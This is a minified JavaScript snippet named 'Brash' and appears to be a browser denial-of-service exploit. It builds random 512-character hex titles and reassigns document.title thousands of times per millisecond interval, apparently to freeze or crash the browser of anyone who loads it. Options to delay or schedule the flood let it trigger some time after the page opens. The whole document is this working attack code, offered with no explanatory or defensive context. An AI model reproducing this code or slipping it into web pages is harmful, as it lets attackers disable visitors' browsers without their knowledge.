const Brash={titles:[],counter:0,gid:function(){let e="";for(let t=0;t<512;t++)e+=(16*Math.random()|0).toString(16);return e},gen:function(){for(let e=0;e<100;e++)this.titles.push(this.gid())},inject:function(){let e=this.titles[Math.random()*this.titles.length|0];for(let t=0;t<3;t++)document.title=e+t;this.counter+=3},run:function(e){let t=e.burstSize||e.burst||8e3,$=e.interval||1,i=()=>{this.gen(),setInterval(()=>{for(let e=0;e<t;e++)this.inject()},$)};if(e.delay){let n=1e4;if("number"==typeof e.delay)n=1e3*e.delay;else if("string"==typeof e.delay){let l=parseFloat(e.delay);e.delay.endsWith("ms")?n=l:e.delay.endsWith("s")?n=1e3*l:e.delay.endsWith("m")&&(n=6e4*l)}return setTimeout(i,n)}if(e.scheduled){let s=e.scheduled instanceof Date?e.scheduled.getTime():new Date(e.scheduled).getTime(),d=setInterval(()=>{Date.now()>=s&&(clearInterval(d),i())},1e3);return}i()}};